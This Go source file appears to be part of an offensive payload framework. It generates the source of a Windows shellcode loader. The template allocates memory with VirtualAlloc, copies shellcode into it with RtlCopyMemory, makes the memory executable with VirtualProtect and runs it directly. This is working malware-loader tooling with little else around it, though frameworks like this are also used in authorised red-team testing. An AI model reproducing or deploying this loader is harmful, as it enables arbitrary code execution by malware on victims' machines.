package loaders

import (
	"fmt"
	"strings"
)

type SysTemplate struct {
}

func (t SysTemplate) Import() string {
	return fmt.Sprintf(`
import (
	"syscall"
	"unsafe"
)
`)
}

func (t SysTemplate) Const() string {
	return fmt.Sprintf(`
const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)
`)
}

func (t SysTemplate) Init() string {
	return fmt.Sprintf(`
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	ntdll := syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	VirtualProtect := kernel32.MustFindProc("VirtualProtect")
	RtlCopyMemory := ntdll.MustFindProc("RtlCopyMemory")
`)
}

func (t SysTemplate) Process() string {
	return fmt.Sprintf(`
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	oldProtect := PAGE_READWRITE
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, _ = syscall.SyscallN(addr)
`)
}

func (t SysTemplate) GetTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__INIT__

__IMPORT__PROCESS__

}
`
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return template
}
